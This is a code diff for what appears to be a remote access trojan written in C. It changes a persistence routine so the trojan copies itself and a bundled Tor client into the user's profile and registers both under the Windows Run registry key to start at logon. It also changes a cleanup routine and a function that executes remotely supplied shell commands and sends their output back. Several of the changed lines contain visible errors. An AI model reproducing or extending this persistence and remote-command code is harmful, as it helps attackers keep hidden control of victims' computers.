@@ -387,13 +387,15 @@ char* say_hello()
 
 void persist()
 {
-#if _WIN32
+//#if _WIN32
     char *persist_dir = malloc(BUFFER_SIZE);
-    char *user_dir = getenv("USERPROFILE");
-    char *apic = "\\apic";
-    sprintf(persist_dir,"%s%s",user_dir,apic);
+    char *persist_dir_win = malloc(BUFFER_SIZE);
+    //char *user_dir = getenv("USERPROFILE");
+    char *user_dir = "~";
+    sprintf(persist_dir_win,"%s%s",user_dir,"\\apic");
+    sprintf(persist_dir,"%s%s",user_dir,"/apic");
     struct stat st = {0};
-    if(stat(persist_dir, &st) == -1)
+    if(stat(persist_dir, &st) == -1 || stat(persist_dir_win, &st) == -1)
     {
         mkdir(persist_dir, 0755);
     }
@@ -403,20 +405,34 @@ void persist()
         return;
     }
     char *command = malloc(BUFFER_SIZE);
-    sprintf(command, "cp .\\apic %s\\apic", persist_dir);
+    sprintf(command, "cp");
+    if(system(command) != -1)
+    {
+        sprintf(command, "mkdir -p %s/apic && cp ./apic %s/apic", persist_dir, persist_dir);
+        system(command);
+        sprintf(command, "mkdir -p %s/tor && cp -r ./tor %s/tor", persist_dir, persist_dir);
+        system(command);
+    }
+    sprintf(command, "copy");
+    if(system(command) != -1)
+    {
+        sprintf(command, "if not exist \"%s\\apic\" mkdir %s\\apic && copy .\\apic %s\\apic",
+                persist_dir_win, persist_dir_win, persist_dir_win);
+        system(command);
+        sprintf(command, "if not exist \"%s\\tor\" mkdir %s\\apic && copyx .\\tor %s\\tor",
+                persist_dir_win, persist_dir_win, persist_dir_win);
+        system(command);
+    }
+    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic /t REG_SZ /d \"%s\\apic\\apic.exe\"", persist_dir_win);
     system(command);
-    sprintf(command, "cp -r .\\tor %s\\tor", persist_dir);
+    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor /t REG_SZ /d \"%s\\tor\\tor\\tor.exe\"", persist_dir_win);
     system(command);
-    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic /t REG_SZ /d \"%s\\apic\\apic.exe\"", persist_dir);
-    system(command);
-    //sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor /t REG_SZ /d \"%s\\tor\\tor\\tor.exe\"", persist_dir);
-    //system(command);
     printf("Installed!");
     printf("\n");
     send_output("[+] Installed",true);
-#elif __LINUX__
+//#elif __LINUX__
     //TODO
-#endif
+//#endif
     //pthread_exit(NULL);
     return;
 }
@@ -424,10 +440,10 @@ void persist()
 void clean()
 {
 #if _WIN32
-    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic");
+    sprintf(command, "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic");
     system(command);
-    //sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor");
-    //system(command);
+    sprintf(command, "reg deleteHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor");
+    system(command);
     printf("Removed!");
     printf("\n");
     send_output("[+] Removed",true);
@@ -476,7 +492,7 @@ void* do_command(void* input)
 {
     char* instruction = " 2>&1";
     char* command = malloc(strlen(input) + strlen(instruction) + BUFFER_SIZE);
-    sprintf(command, "%s %s",input, instruction);
+    sprintf(command, "%s %s",(char*)input, instruction);
     char buffer[BUFFER_SIZE*2];
     size_t buffer_size = BUFFER_SIZE*2;
     char *output = malloc(BUFFER_SIZE*2);
